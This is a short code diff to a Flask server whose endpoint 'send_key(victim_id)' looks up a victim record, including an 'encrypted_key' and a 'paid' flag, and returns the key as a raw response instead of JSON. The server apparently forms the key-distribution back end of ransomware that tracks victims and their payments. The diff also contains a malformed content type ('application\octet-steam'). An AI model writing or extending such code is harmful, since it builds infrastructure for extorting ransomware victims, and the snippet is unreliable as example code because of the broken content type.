@@ -1,6 +1,6 @@
 # install flask pip install flask before running the server
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, Response
 import json
 
 app = Flask(__name__)
@@ -52,12 +52,7 @@ def send_key(victim_id):
     encrypted_key = victims[victim_id].get('encrypted_key', 'NONE')
     paid = victims[victim_id].get('paid', 'NONE')
     
-    return jsonify({
-        "status": "success",
-        "paid": paid,
-        "victim_id": victim_id,
-        "encrypted_key": encrypted_key
-    }), 200
+    return Response(encrypted_key, content_type='application\octet-steam')
 
 # test endpoint
 @app.route('/test', methods=['GET'])
